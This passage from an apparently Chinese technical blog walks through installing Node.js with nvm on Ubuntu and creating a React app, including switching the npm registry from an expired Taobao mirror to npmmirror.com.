--reinstall-packages-from=&lt;version&gt;     When installing, reinstall packages installed <span class="hljs-keyword">in</span> &lt;node|iojs|node version number&gt;<br>    --lts                                   When installing, only select from LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When installing, only select from versions <span class="hljs-keyword">for</span> a specific LTS line<br>    --skip-default-packages                 When installing, skip the default-packages file <span class="hljs-keyword">if</span> it exists<br>    --latest-npm                            After installing, attempt to upgrade to the latest working npm on the given node version<br>    --no-progress                           Disable the progress bar on any downloads<br>  nvm uninstall &lt;version&gt;                   Uninstall a version<br>  nvm uninstall --lts                       Uninstall using automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>  nvm uninstall --lts=&lt;LTS name&gt;            Uninstall using automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm use [--silent] &lt;version&gt;              Modify PATH to use &lt;version&gt;. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm <span class="hljs-built_in">exec</span> [--silent] &lt;version&gt; [&lt;<span class="hljs-built_in">command</span>&gt;] Run &lt;<span class="hljs-built_in">command</span>&gt; on &lt;version&gt;. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm run [--silent] &lt;version&gt; [&lt;args&gt;]     Run `node` on &lt;version&gt; with &lt;args&gt; as arguments. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm current                               Display currently activated version of Node<br>  nvm <span class="hljs-built_in">ls</span> [&lt;version&gt;]                        List installed versions, matching a given &lt;version&gt; <span class="hljs-keyword">if</span> provided<br>    --no-colors                             Suppress colored output<br>    --no-alias                              Suppress `nvm <span class="hljs-built_in">alias</span>` output<br>  nvm ls-remote [&lt;version&gt;]                 List remote versions available <span class="hljs-keyword">for</span> install, matching a given &lt;version&gt; <span class="hljs-keyword">if</span> provided<br>    --lts                                   When listing, only show LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When listing, only show versions <span class="hljs-keyword">for</span> a specific LTS line<br>    --no-colors                             Suppress colored output<br>  nvm version &lt;version&gt;                     Resolve the given description to a single <span class="hljs-built_in">local</span> version<br>  nvm version-remote &lt;version&gt;              Resolve the given description to a single remote version<br>    --lts                                   When listing, only select from LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When listing, only select from versions <span class="hljs-keyword">for</span> a specific LTS line<br>  nvm deactivate                            Undo effects of `nvm` on current shell<br>  nvm <span class="hljs-built_in">alias</span> [&lt;pattern&gt;]                     Show all aliases beginning with &lt;pattern&gt;<br>    --no-colors                             Suppress colored output<br>  nvm <span class="hljs-built_in">alias</span> &lt;name&gt; &lt;version&gt;                Set an <span class="hljs-built_in">alias</span> named &lt;name&gt; pointing to &lt;version&gt;<br>  nvm <span class="hljs-built_in">unalias</span> &lt;name&gt;                        Deletes the <span class="hljs-built_in">alias</span> named &lt;name&gt;<br>  nvm install-latest-npm                    Attempt to upgrade to the latest working `npm` on the current node version<br>  nvm reinstall-packages &lt;version&gt;          Reinstall global `npm` packages contained <span class="hljs-keyword">in</span> &lt;version&gt; to current version<br>  nvm unload                                Unload `nvm` from shell<br>  nvm <span class="hljs-built_in">which</span> [current | &lt;version&gt;]           Display path to installed node version. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>  nvm cache <span class="hljs-built_in">dir</span>                             Display path to the cache directory <span class="hljs-keyword">for</span> nvm<br>  nvm cache clear                           Empty cache directory <span class="hljs-keyword">for</span> nvm<br><br>Example:<br>  nvm install 8.0.0                     Install a specific version number<br>  nvm use 8.0                           Use the latest available 8.0.x release<br>  nvm run 6.10.3 app.js                 Run app.js using node 6.10.3<br>  nvm <span class="hljs-built_in">exec</span> 4.8.3 node app.js            Run `node app.js` with the PATH pointing to node 4.8.3<br>  nvm <span class="hljs-built_in">alias</span> default 8.1.0               Set default node version on a shell<br>  nvm <span class="hljs-built_in">alias</span> default node                Always default to the latest available node version on a shell<br><br>Note:<br>  to remove, delete, or uninstall nvm - just remove the `<span class="hljs-variable">$NVM_DIR</span>` folder (usually `~/.nvm`)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls</span><br>               <br>-&gt;       system<br>iojs -&gt; N/A (default)<br>node -&gt; stable (-&gt; N/A) (default)<br>unstable -&gt; N/A (default)<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls-remote |grep LTS</span><br>         v4.2.0   (LTS: Argon)<br>         v4.2.1   (LTS: Argon)<br>         v4.2.2   (LTS: Argon)<br>         v4.2.3   (LTS: Argon)<br>         v4.2.4   (LTS: Argon)<br>         v4.2.5   (LTS: Argon)<br>         v4.2.6   (LTS: Argon)<br>         v4.3.0   (LTS: Argon)<br>         v4.3.1   (LTS: Argon)<br>         v4.3.2   (LTS: Argon)<br>         v4.4.0   (LTS: Argon)<br>         v4.4.1   (LTS: Argon)<br>         v4.4.2   (LTS: Argon)<br>         v4.4.3   (LTS: Argon)<br>         v4.4.4   (LTS: Argon)<br>         v4.4.5   (LTS: Argon)<br>         v4.4.6   (LTS: Argon)<br>         v4.4.7   (LTS: Argon)<br>         v4.5.0   (LTS: Argon)<br>         v4.6.0   (LTS: Argon)<br>         v4.6.1   (LTS: Argon)<br>         v4.6.2   (LTS: Argon)<br>         v4.7.0   (LTS: Argon)<br>         v4.7.1   (LTS: Argon)<br>         v4.7.2   (LTS: Argon)<br>         v4.7.3   (LTS: Argon)<br>         v4.8.0   (LTS: Argon)<br>         v4.8.1   (LTS: Argon)<br>         v4.8.2   (LTS: Argon)<br>         v4.8.3   (LTS: Argon)<br>         v4.8.4   (LTS: Argon)<br>         v4.8.5   (LTS: Argon)<br>         v4.8.6   (LTS: Argon)<br>         v4.8.7   (LTS: Argon)<br>         v4.9.0   (LTS: Argon)<br>         v4.9.1   (Latest LTS: Argon)<br>         v6.9.0   (LTS: Boron)<br>         v6.9.1   (LTS: Boron)<br>         v6.9.2   (LTS: Boron)<br>         v6.9.3   (LTS: Boron)<br>         v6.9.4   (LTS: Boron)<br>         v6.9.5   (LTS: Boron)<br>        v6.10.0   (LTS: Boron)<br>        v6.10.1   (LTS: Boron)<br>        v6.10.2   (LTS: Boron)<br>        v6.10.3   (LTS: Boron)<br>        v6.11.0   (LTS: Boron)<br>        v6.11.1   (LTS: Boron)<br>        v6.11.2   (LTS: Boron)<br>        v6.11.3   (LTS: Boron)<br>        v6.11.4   (LTS: Boron)<br>        v6.11.5   (LTS: Boron)<br>        v6.12.0   (LTS: Boron)<br>        v6.12.1   (LTS: Boron)<br>        v6.12.2   (LTS: Boron)<br>        v6.12.3   (LTS: Boron)<br>        v6.13.0   (LTS: Boron)<br>        v6.13.1   (LTS: Boron)<br>        v6.14.0   (LTS: Boron)<br>        v6.14.1   (LTS: Boron)<br>        v6.14.2   (LTS: Boron)<br>        v6.14.3   (LTS: Boron)<br>        v6.14.4   (LTS: Boron)<br>        v6.15.0   (LTS: Boron)<br>        v6.15.1   (LTS: Boron)<br>        v6.16.0   (LTS: Boron)<br>        v6.17.0   (LTS: Boron)<br>        v6.17.1   (Latest LTS: Boron)<br>         v8.9.0   (LTS: Carbon)<br>         v8.9.1   (LTS: Carbon)<br>         v8.9.2   (LTS: Carbon)<br>         v8.9.3   (LTS: Carbon)<br>         v8.9.4   (LTS: Carbon)<br>        v8.10.0   (LTS: Carbon)<br>        v8.11.0   (LTS: Carbon)<br>        v8.11.1   (LTS: Carbon)<br>        v8.11.2   (LTS: Carbon)<br>        v8.11.3   (LTS: Carbon)<br>        v8.11.4   (LTS: Carbon)<br>        v8.12.0   (LTS: Carbon)<br>        v8.13.0   (LTS: Carbon)<br>        v8.14.0   (LTS: Carbon)<br>        v8.14.1   (LTS: Carbon)<br>        v8.15.0   (LTS: Carbon)<br>        v8.15.1   (LTS: Carbon)<br>        v8.16.0   (LTS: Carbon)<br>        v8.16.1   (LTS: Carbon)<br>        v8.16.2   (LTS: Carbon)<br>        v8.17.0   (Latest LTS: Carbon)<br>       v10.13.0   (LTS: Dubnium)<br>       v10.14.0   (LTS: Dubnium)<br>       v10.14.1   (LTS: Dubnium)<br>       v10.14.2   (LTS: Dubnium)<br>       v10.15.0   (LTS: Dubnium)<br>       v10.15.1   (LTS: Dubnium)<br>       v10.15.2   (LTS: Dubnium)<br>       v10.15.3   (LTS: Dubnium)<br>       v10.16.0   (LTS: Dubnium)<br>       v10.16.1   (LTS: Dubnium)<br>       v10.16.2   (LTS: Dubnium)<br>       v10.16.3   (LTS: Dubnium)<br>       v10.17.0   (LTS: Dubnium)<br>       v10.18.0   (LTS: Dubnium)<br>       v10.18.1   (LTS: Dubnium)<br>       v10.19.0   (LTS: Dubnium)<br>       v10.20.0   (LTS: Dubnium)<br>       v10.20.1   (LTS: Dubnium)<br>       v10.21.0   (LTS: Dubnium)<br>       v10.22.0   (LTS: Dubnium)<br>       v10.22.1   (LTS: Dubnium)<br>       v10.23.0   (LTS: Dubnium)<br>       v10.23.1   (LTS: Dubnium)<br>       v10.23.2   (LTS: Dubnium)<br>       v10.23.3   (LTS: Dubnium)<br>       v10.24.0   (LTS: Dubnium)<br>       v10.24.1   (Latest LTS: Dubnium)<br>       v12.13.0   (LTS: Erbium)<br>       v12.13.1   (LTS: Erbium)<br>       v12.14.0   (LTS: Erbium)<br>       v12.14.1   (LTS: Erbium)<br>       v12.15.0   (LTS: Erbium)<br>       v12.16.0   (LTS: Erbium)<br>       v12.16.1   (LTS: Erbium)<br>       v12.16.2   (LTS: Erbium)<br>       v12.16.3   (LTS: Erbium)<br>       v12.17.0   (LTS: Erbium)<br>       v12.18.0   (LTS: Erbium)<br>       v12.18.1   (LTS: Erbium)<br>       v12.18.2   (LTS: Erbium)<br>       v12.18.3   (LTS: Erbium)<br>       v12.18.4   (LTS: Erbium)<br>       v12.19.0   (LTS: Erbium)<br>       v12.19.1   (LTS: Erbium)<br>       v12.20.0   (LTS: Erbium)<br>       v12.20.1   (LTS: Erbium)<br>       v12.20.2   (LTS: Erbium)<br>       v12.21.0   (LTS: Erbium)<br>       v12.22.0   (LTS: Erbium)<br>       v12.22.1   (LTS: Erbium)<br>       v12.22.2   (LTS: Erbium)<br>       v12.22.3   (LTS: Erbium)<br>       v12.22.4   (LTS: Erbium)<br>       v12.22.5   (LTS: Erbium)<br>       v12.22.6   (LTS: Erbium)<br>       v12.22.7   (LTS: Erbium)<br>       v12.22.8   (LTS: Erbium)<br>       v12.22.9   (LTS: Erbium)<br>      v12.22.10   (LTS: Erbium)<br>      v12.22.11   (LTS: Erbium)<br>      v12.22.12   (Latest LTS: Erbium)<br>       v14.15.0   (LTS: Fermium)<br>       v14.15.1   (LTS: Fermium)<br>       v14.15.2   (LTS: Fermium)<br>       v14.15.3   (LTS: Fermium)<br>       v14.15.4   (LTS: Fermium)<br>       v14.15.5   (LTS: Fermium)<br>       v14.16.0   (LTS: Fermium)<br>       v14.16.1   (LTS: Fermium)<br>       v14.17.0   (LTS: Fermium)<br>       v14.17.1   (LTS: Fermium)<br>       v14.17.2   (LTS: Fermium)<br>       v14.17.3   (LTS: Fermium)<br>       v14.17.4   (LTS: Fermium)<br>       v14.17.5   (LTS: Fermium)<br>       v14.17.6   (LTS: Fermium)<br>       v14.18.0   (LTS: Fermium)<br>       v14.18.1   (LTS: Fermium)<br>       v14.18.2   (LTS: Fermium)<br>       v14.18.3   (LTS: Fermium)<br>       v14.19.0   (LTS: Fermium)<br>       v14.19.1   (LTS: Fermium)<br>       v14.19.2   (LTS: Fermium)<br>       v14.19.3   (LTS: Fermium)<br>       v14.20.0   (LTS: Fermium)<br>       v14.20.1   (LTS: Fermium)<br>       v14.21.0   (LTS: Fermium)<br>       v14.21.1   (LTS: Fermium)<br>       v14.21.2   (LTS: Fermium)<br>       v14.21.3   (Latest LTS: Fermium)<br>       v16.13.0   (LTS: Gallium)<br>       v16.13.1   (LTS: Gallium)<br>       v16.13.2   (LTS: Gallium)<br>       v16.14.0   (LTS: Gallium)<br>       v16.14.1   (LTS: Gallium)<br>       v16.14.2   (LTS: Gallium)<br>       v16.15.0   (LTS: Gallium)<br>       v16.15.1   (LTS: Gallium)<br>       v16.16.0   (LTS: Gallium)<br>       v16.17.0   (LTS: Gallium)<br>       v16.17.1   (LTS: Gallium)<br>       v16.18.0   (LTS: Gallium)<br>       v16.18.1   (LTS: Gallium)<br>       v16.19.0   (LTS: Gallium)<br>       v16.19.1   (LTS: Gallium)<br>       v16.20.0   (LTS: Gallium)<br>       v16.20.1   (LTS: Gallium)<br>       v16.20.2   (Latest LTS: Gallium)<br>       v18.12.0   (LTS: Hydrogen)<br>       v18.12.1   (LTS: Hydrogen)<br>       v18.13.0   (LTS: Hydrogen)<br>       v18.14.0   (LTS: Hydrogen)<br>       v18.14.1   (LTS: Hydrogen)<br>       v18.14.2   (LTS: Hydrogen)<br>       v18.15.0   (LTS: Hydrogen)<br>       v18.16.0   (LTS: Hydrogen)<br>       v18.16.1   (LTS: Hydrogen)<br>       v18.17.0   (LTS: Hydrogen)<br>       v18.17.1   (LTS: Hydrogen)<br>       v18.18.0   (LTS: Hydrogen)<br>       v18.18.1   (LTS: Hydrogen)<br>       v18.18.2   (LTS: Hydrogen)<br>       v18.19.0   (LTS: Hydrogen)<br>       v18.19.1   (LTS: Hydrogen)<br>       v18.20.0   (LTS: Hydrogen)<br>       v18.20.1   (LTS: Hydrogen)<br>       v18.20.2   (Latest LTS: Hydrogen)<br>        v20.9.0   (LTS: Iron)<br>       v20.10.0   (LTS: Iron)<br>       v20.11.0   (LTS: Iron)<br>       v20.11.1   (LTS: Iron)<br>       v20.12.0   (LTS: Iron)<br>       v20.12.1   (LTS: Iron)<br>       v20.12.2   (LTS: Iron)<br>       v20.13.0   (Latest LTS: Iron)<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm install v20.13.0</span><br>Downloading and installing node v20.13.0...<br>Downloading https://nodejs.org/dist/v20.13.0/node-v20.13.0-linux-x64.tar.xz...<br><span class="hljs-comment">################################################################################################################################################################################# 100.0%</span><br>Computing checksum with <span class="hljs-built_in">sha256sum</span><br>Checksums matched!<br>Now using node v20.13.0 (npm v10.5.2)<br>Creating default <span class="hljs-built_in">alias</span>: default -&gt; v20.13.0<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls</span><br>-&gt;     v20.13.0<br>         system<br>default -&gt; v20.13.0<br>node -&gt; stable (-&gt; v20.13.0) (default)<br>stable -&gt; 20.13 (-&gt; v20.13.0) (default)<br>iojs -&gt; N/A (default)<br>unstable -&gt; N/A (default)<br>lts/* -&gt; lts/iron (-&gt; v20.13.0)<br>lts/argon -&gt; v4.9.1 (-&gt; N/A)<br>lts/boron -&gt; v6.17.1 (-&gt; N/A)<br>lts/carbon -&gt; v8.17.0 (-&gt; N/A)<br>lts/dubnium -&gt; v10.24.1 (-&gt; N/A)<br>lts/erbium -&gt; v12.22.12 (-&gt; N/A)<br>lts/fermium -&gt; v14.21.3 (-&gt; N/A)<br>lts/gallium -&gt; v16.20.2 (-&gt; N/A)<br>lts/hydrogen -&gt; v18.20.2 (-&gt; N/A)<br>lts/iron -&gt; v20.13.0<br><br></code></pre></td></tr></table></figure><h1 id="å¼€å§‹å®‰è£…ï¼Œè´¼æ…¢"><a href="#å¼€å§‹å®‰è£…ï¼Œè´¼æ…¢" class="headerlink" title="å¼€å§‹å®‰è£…ï¼Œè´¼æ…¢"></a>å¼€å§‹å®‰è£…ï¼Œè´¼æ…¢</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br><br>Creating a new React app <span class="hljs-keyword">in</span> /root/my-app.<br><br>Installing packages. This might take a couple of minutes.<br>Installing react, react-dom, and react-scripts with cra-template...<br><br>(<span class="hljs-comment">#########â ‚â ‚â ‚â ‚â ‚â ‚â ‚â ‚â ‚) â ‹ idealTree:@babel/core: sill placeDep ROOT semver@7.6.1 OK for: react-scripts@5.0.1 want: ^7.3.5</span><br><br></code></pre></td></tr></table></figure><h1 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># åŸå§‹</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npmjs.org/<br><br><br><span class="hljs-comment"># æ¢æº</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config set registry https://registry.npm.taobao.org</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><h1 id="é‡æ–°å®‰è£…ï¼ŒæŠ¥é”™è¯ä¹¦é—®é¢˜"><a href="#é‡æ–°å®‰è£…ï¼ŒæŠ¥é”™è¯ä¹¦é—®é¢˜" class="headerlink" title="é‡æ–°å®‰è£…ï¼ŒæŠ¥é”™è¯ä¹¦é—®é¢˜"></a>é‡æ–°å®‰è£…ï¼ŒæŠ¥é”™è¯ä¹¦é—®é¢˜</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>npm ERR! code CERT_HAS_EXPIRED<br>npm ERR! errno CERT_HAS_EXPIRED<br>npm ERR! request to https://registry.npm.taobao.org/create-react-app failed, reason: certificate has expired<br><br>npm ERR! A complete <span class="hljs-built_in">log</span> of this run can be found <span class="hljs-keyword">in</span>: /root/.npm/_logs/2024-05-08T15_23_38_989Z-debug-0.log<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>åŸå› ï¼šè®¾ç½®çš„æ·˜å®é•œåƒè¿‡æœŸäº†</p><h1 id="é‡æ–°æ¢æº"><a href="#é‡æ–°æ¢æº" class="headerlink" title="é‡æ–°æ¢æº"></a>é‡æ–°æ¢æº</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npm config set registry https://registry.npmmirror.com</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npmmirror.com<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config list</span><br>; <span class="hljs-string">&quot;user&quot;</span> config from /root/.npmrc<br><br>registry = <span class="hljs-string">&quot;https://registry.npmmirror.com&quot;</span> <br><br>; node bin location = /root/.nvm/versions/node/v20.13.0/bin/node<br>; node version = v20.13.0<br>; npm <span class="hljs-built_in">local</span> prefix = /root<br>; npm version = 10.5.2<br>; cwd = /root<br>; HOME = /root<br>; Run `npm config <span class="hljs-built_in">ls</span> -l` to show all defaults.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="å†æ¬¡å®‰è£…ï¼ŒæˆåŠŸ"><a href="#å†æ¬¡å®‰è£…ï¼ŒæˆåŠŸ" class="headerlink" title="å†æ¬¡å®‰è£…ï¼ŒæˆåŠŸ~"></a>å†æ¬¡å®‰è£…ï¼ŒæˆåŠŸ~</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>Need to install the following packages:<br>create-react-app@5.0.1<br>Ok to proceed? (y) y<br><br>Creating a new React app <span class="hljs-keyword">in</span> /root/my-app.<br><br>Installing packages. This might take a couple of minutes.<br>Installing react, react-dom, and react-scripts with cra-template...<br><br><br>added 1489 packages <span class="hljs-keyword">in</span> 2m<br><br>258 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br><br>Initialized a git repository.<br><br>Installing template dependencies using npm...<br><br>added 67 packages, and changed 1 package <span class="hljs-keyword">in</span> 10s<br><br>262 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br>Removing template package using npm...<br><br><br>removed 1 package <span class="hljs-keyword">in</span> 4s<br><br>262 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br><br>Created git commit.<br><br>Success! Created my-app at /root/my-app<br>Inside that directory, you can run several commands:<br><br>  npm start<br>    Starts the development server.<br><br>  